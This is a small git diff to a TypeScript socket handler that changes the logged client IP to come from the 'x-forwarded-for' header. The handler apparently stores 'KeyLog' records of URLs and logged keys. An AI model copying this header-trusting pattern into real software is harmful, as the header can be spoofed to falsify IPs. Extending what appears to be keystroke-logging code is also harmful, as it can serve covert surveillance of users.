@@ -6,7 +6,7 @@ import log from '../bin/logger'
 
 
 export default async (socket:Socket) => {
-    const ip = socket.handshake.address
+    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address
     const sessionId = socket.id
     const keyLog:KeyLog = {url: '', log: '', date: new Date()}
 
